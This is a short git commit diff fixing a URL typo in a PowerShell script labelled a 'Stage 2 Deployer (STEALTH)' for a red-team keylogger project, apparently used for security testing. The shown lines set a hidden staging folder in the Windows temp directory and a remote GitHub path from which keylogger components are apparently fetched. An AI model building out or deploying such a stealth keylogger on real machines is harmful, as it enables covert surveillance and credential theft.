a883c42b8f2773e29c85ac99c714a26e90b8af03
pavelyoav-eng <pavelyoav@gmail.com>
2026-03-12 17:52:25 +0200

    fixed syntax bug

--- red-team/keylogger/deploy.ps1
+++ red-team/keylogger/deploy.ps1
@@ -1,7 +1,7 @@
 # Project Cerberus - Stage 2 Deployer (STEALTH)
 
 $dir  = "C:\Windows\Temp\cerberus"
-$base = "ttps://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/v2.0/red-team/keylogger/deploy.ps1"
+$base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/v2.0/red-team/keylogger"
 $log  = "C:\Windows\Temp\cerberus_deploy.log"
 
 function Log($msg) {
